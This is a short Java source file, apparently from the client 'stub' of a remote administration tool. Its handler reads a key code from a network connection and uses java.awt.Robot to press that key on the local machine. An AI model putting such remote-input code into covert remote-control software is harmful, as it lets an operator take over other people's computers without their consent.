package com.redpois0n.stub.packets.incoming;

import com.redpois0n.stub.Connection;
import com.redpois0n.stub.Main;

public class Packet94KeyPress extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		int btn = Connection.readInt();
		Main.robot.keyPress(btn);
	}

}
